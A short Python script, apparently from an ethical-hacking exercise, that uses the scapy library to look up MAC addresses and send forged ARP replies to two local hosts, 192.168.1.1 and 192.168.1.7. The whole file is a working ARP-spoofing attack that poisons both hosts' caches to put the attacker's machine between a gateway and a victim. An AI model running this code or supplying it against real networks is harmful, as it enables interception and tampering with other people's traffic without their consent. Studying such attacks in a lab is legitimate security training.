#!/usr/bin/env python

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(packet)


spoof("192.168.1.1", "192.168.1.7")
spoof("192.168.1.7", "192.168.1.1")
